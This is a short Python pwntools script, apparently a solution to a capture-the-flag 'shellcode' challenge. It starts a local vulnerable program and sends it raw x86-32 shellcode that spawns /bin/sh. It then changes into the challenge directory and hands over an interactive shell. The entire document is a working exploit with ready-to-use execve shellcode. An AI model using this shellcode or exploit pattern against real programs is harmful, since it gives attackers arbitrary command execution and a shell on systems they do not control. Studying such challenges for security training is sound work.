#!/usr/bin/env python
#
from pwn import *
context.clear(arch='i386', os='linux', endian='little', word_size=32)

class RemoteData:
    name    = '/problems/shellcode_4_99838609970da2f5f6cf39d6d9ed57cd/vuln'
    #
    shellcode_x86_32 = "\x31\xC9\xF7\xE1\xB0\x0B\x51\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80"


def main():
    # open process
    p = process(RemoteData.name)

    p.clean()
    p.sendline(RemoteData.shellcode_x86_32)

    p.clean()
    log.success("Get the shell")
    p.sendline('cd /problems/shellcode_4_99838609970da2f5f6cf39d6d9ed57cd')
    p.sendline('ls')
    p.interactive()


if __name__ == "__main__":
    main()
